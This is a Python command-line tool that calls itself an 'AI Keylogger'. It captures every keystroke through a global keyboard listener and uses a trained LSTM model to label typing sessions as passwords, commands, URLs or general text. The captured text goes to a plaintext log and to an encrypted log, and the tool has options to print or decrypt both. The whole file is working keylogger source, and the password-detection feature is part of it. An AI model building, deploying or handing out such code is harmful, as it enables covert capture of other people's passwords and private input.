#!/usr/bin/env python3.9
import argparse
import os
import time
import json
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import numpy as np
from tensorflow.keras.models import load_model

# --- Setup logs directory ---
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# --- File paths inside logs folder ---
KEY_FILE = os.path.join(LOG_DIR, "behavior_key.key")
LOG_FILE = os.path.join(LOG_DIR, "behavior_log.txt")
ENCRYPTED_LOG_FILE = os.path.join(LOG_DIR, "behavior_encrypted_log.bin")
MODEL_PATH = "behavior_model.h5"

# --- Load or generate key ---
def load_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as f:
            return f.read()
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    return key

fernet = Fernet(load_key())
model = load_model(MODEL_PATH)

# --- AI: Predict typing behavior using LSTM ---
def predict_behavior(delays):
    try:
        input_seq = np.array(delays).reshape((1, len(delays), 1))
        prediction = model.predict(input_seq, verbose=0)
        labels = ["Command", "Password", "URL", "General"]
        return labels[np.argmax(prediction)]
    except:
        return "Unknown"

# --- Start Keylogger ---
def start_logging():
    keys = []
    timestamps = []

    def on_press(key):
        try:
            keys.append(key.char)
        except:
            keys.append(str(key))

        now = time.time()
        if timestamps:
            timestamps.append(now - timestamps[-1])
        else:
            timestamps.append(now)

        if key == keyboard.Key.esc:
            return False

    print("[🔴] Logging... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    if len(timestamps) > 1:
        delays = timestamps[1:]
    else:
        delays = [0.0]

    typed = ''.join(keys).replace('Key.space', ' ').replace('Key.enter', '\n')
    behavior = predict_behavior(delays)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = f"[{timestamp}]\nTyped: {typed}\nDetected: {behavior}\nDelays: {delays}\n---\n"

    with open(LOG_FILE, 'a') as f:
        f.write(entry)

    encrypted = fernet.encrypt(entry.encode())
    with open(ENCRYPTED_LOG_FILE, 'ab') as f:
        f.write(encrypted + b"\n")

    print(f"[✅] Logged and encrypted. Classified as: {behavior}")

# --- Analyze Logs (plain) ---
def analyze_logs():
    if not os.path.exists(LOG_FILE):
        print("[❌] No log file found.")
        return
    with open(LOG_FILE, 'r') as f:
        print("[🧠] Behavior Analysis:\n")
        print(f.read())

# --- Decrypt Logs ---
def decrypt_logs():
    if not os.path.exists(ENCRYPTED_LOG_FILE):
        print("[❌] No encrypted logs found.")
        return
    with open(ENCRYPTED_LOG_FILE, 'rb') as f:
        lines = f.readlines()
        print("[🔓] Decrypted Log:\n")
        for line in lines:
            try:
                print(fernet.decrypt(line).decode())
            except:
                print("[!] Failed to decrypt one line.")

# --- CLI ---
parser = argparse.ArgumentParser(description="AI Keylogger CLI Tool")
parser.add_argument("--start", action="store_true", help="Start keylogger")
parser.add_argument("--analyze", action="store_true", help="Analyze behavior logs")
parser.add_argument("--decrypt", action="store_true", help="Decrypt encrypted logs")
args = parser.parse_args()

if args.start:
    start_logging()
elif args.analyze:
    analyze_logs()
elif args.decrypt:
    decrypt_logs()
else:
    parser.print_help()
